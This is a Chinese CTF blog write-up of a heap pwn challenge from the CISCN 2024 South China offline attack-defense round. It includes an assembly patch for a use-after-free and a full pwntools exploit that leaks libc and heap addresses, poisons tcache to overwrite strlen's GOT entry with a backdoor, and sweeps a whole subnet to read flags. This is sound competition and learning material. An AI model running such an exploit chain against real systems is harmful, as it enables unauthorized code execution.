<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ciscn2024华南赛区线下 | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>ciscn2024华南赛区线下</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-06-10T11:24:22.000Z" id="date"> 2024-06-10</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-03T02:14:52.571Z" id="updated"> 2024-12-03</time></div></span></div></div><hr><div id="post-content"><p><em>支持绿盟.jpg</em></p>
<p><strong>先吐槽pwn题的靶机</strong></p>
<p>开局修好了文件，发现winscp传东西传不上去(没权限)，问裁判咋回事，裁判说这是防止对面打进来删flag删库，把my_heap和flag.txt都设置成root权限了</p>
<p>？这我咋修？</p>
<p>大概差不多十一点，因为我winscp一直连着，这个点能传文件了，但是ssh又被ban了，chmod +x 想都别想</p>
<p>就跟靶机玩了一上午，吃完中饭1点钟才正式开打a（对，因为权限问题解决不了就没有wd了)）</p>
<p>第一次线下赛主办方先送中饭再开打的</p>
<p>下午送了杯瑞幸还是不错的）</p>
<p><strong>来看题</strong><br>[ciscn2024 华南pwn1]<br>保护全开<br class='item-img' data-src='/2024/06/10/ciscn2024%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/checksec.png'><img src="/2024/06/10/ciscn2024%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/checksec.png"><br>2.34的libc<br><em>漏洞点</em><br>存在backdoor</p>
<p>add没有对大小进行限制,但是只能操作一个chunk</p>
<p>delete存在UAF<br class='item-img' data-src='/2024/06/10/ciscn2024%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/delete.png'><img src="/2024/06/10/ciscn2024%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/delete.png"><br></p>
<p>edit仅有0x8，但是有一次magic，可以泄露backdoor地址以及edit0x10(可以越界)</p>
<p>show会对输出进行一段“加密”，逆一下就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">output=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(libcbase)&lt;<span class="hljs-number">6</span>:<br>    output+=p8((u8(p.recv(<span class="hljs-number">1</span>))^(<span class="hljs-built_in">len</span>(libcbase)+<span class="hljs-number">153</span>)))<br></code></pre></td></tr></table></figure>

<p><em>fix</em><br>system直接改成puts。(看平台，这个可能check不过，队友直接把这个backdoor给nop掉了)</p>
<p>add没修</p>
<p>delete的UAF修法：先把eh_frame段的flag改为7，使其可执行，在上面利用keypatch写下以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">call 0x10E0 ;call free@plt<br>push    rbp<br>mov     rbp, rsp<br><br>mov     rax, cs:buf<br>mov     rdi, rax;get chunk_ptr        <br><br>xor r8,r8<br>push r8<br>pop rax<br>mov cs:buf,rax<br>nop<br><br>jmp 0x13BD;跳回main<br></code></pre></td></tr></table></figure>

<p>再把原来的free改为jmp到自己写的代码上即可</p>
<p><em>break</em><br>没有控制大小和UAF，利用unsortedbin可以泄露libc地址<br>然后可以改strlen为backdoor</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64,p8,u8<br><span class="hljs-comment">#p = remote(&quot;172.16.75.105&quot;,)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><br><span class="hljs-comment">#p = (&quot;172.16.75.105&quot;,9999)</span><br><span class="hljs-comment">#p = process(&quot;my_heap&quot;)</span><br><span class="hljs-comment">#for i in range(0,6):</span><br>    <span class="hljs-comment">#add(i,0x40)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;edit&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;which one you choose?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_1</span>():<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;which one you choose?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    cmd(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    cmd(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">content</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;edit data:&quot;</span>)<br>    p.send(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    add(<span class="hljs-number">0x430</span>)<br>    add_1()<br>    delete()<br>    add_1()<br>    show()<br>    p.recvuntil(<span class="hljs-string">&quot;the data:&quot;</span>)<br>    libcbase=<span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(libcbase)&lt;<span class="hljs-number">6</span>:<br>        libcbase+=p8((u8(p.recv(<span class="hljs-number">1</span>))^(<span class="hljs-built_in">len</span>(libcbase)+<span class="hljs-number">153</span>)))<br><br>    libcbase=u64(libcbase.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x21b0e0</span><br>    success(<span class="hljs-string">&quot;libcbase: %s&quot;</span>,<span class="hljs-built_in">hex</span>(libcbase))<br>    strlen_got=libcbase+libc.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br><br><br>    add(<span class="hljs-number">0x70</span>)<br>    delete()<br>    show()<br>    p.recvuntil(<span class="hljs-string">&quot;the data:&quot;</span>)<br>    key=<span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(key)&lt;<span class="hljs-number">6</span>:<br>        key+=p8((u8(p.recv(<span class="hljs-number">1</span>))^(<span class="hljs-built_in">len</span>(key)+<span class="hljs-number">153</span>)))<br>    key=u64(key.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heapbase=key&lt;&lt;<span class="hljs-number">12</span><br>    success(<span class="hljs-string">&quot;heapbase: %s&quot;</span>,<span class="hljs-built_in">hex</span>(heapbase))<br>    tcache=heapbase+<span class="hljs-number">0xc0</span><br>    addr=heapbase+<span class="hljs-number">0x290</span><br>    success(<span class="hljs-string">&quot;addr: %s&quot;</span>,<span class="hljs-built_in">hex</span>(addr))<br>    success(<span class="hljs-string">&quot;tcache: %s&quot;</span>,<span class="hljs-built_in">hex</span>(tcache))<br><br>    cmd(<span class="hljs-number">5</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>    backdoor=u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>    base=backdoor-<span class="hljs-number">0x12be</span><br>    buf=base+<span class="hljs-number">0x0000000000004040</span><br>    success(<span class="hljs-string">&quot;backdoor: %s&quot;</span>,<span class="hljs-built_in">hex</span>(backdoor))<br>    success(<span class="hljs-string">&quot;base: %s&quot;</span>,<span class="hljs-built_in">hex</span>(base))<br>    p.recvuntil(<span class="hljs-string">&quot;edit data:&quot;</span>)<br>    p.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>    delete()<br>    edit(p64(buf^key))<br>    add(<span class="hljs-number">0x70</span>)<br>    add(<span class="hljs-number">0x70</span>)<br>    edit(p64(strlen_got))<br>    edit(p64(backdoor))<br><br>    p.sendline(<span class="hljs-string">&quot;cat flag.txt&quot;</span>)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>):<br>    <span class="hljs-keyword">global</span> ip,p<br>    ip = <span class="hljs-string">&#x27;172.16.75.&#123;i&#125;&#x27;</span><br>    p = (ip,<span class="hljs-number">9999</span>)<br>    exp()<br><br><br><br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/07/18/disappear/">← 下一篇 disappear</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/">CISCN2024初赛 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>